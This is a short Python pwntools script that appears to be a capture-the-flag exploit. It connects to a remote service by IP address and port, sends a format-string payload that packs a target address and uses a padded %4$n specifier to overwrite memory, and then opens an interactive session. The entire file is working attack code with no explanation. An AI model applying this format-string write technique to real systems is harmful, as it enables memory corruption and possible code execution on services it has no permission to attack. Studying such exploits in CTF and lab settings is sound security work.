from pwn import *




#p=process("./task")
p=remote("54.208.125.237" ,1301)
print p.recvline()
payload=p32(0x804a034+5)
payload+="%4$"+str(26739-12)+"x"
payload+="%4$n"
pause()
p.sendline(payload)
p.interactive()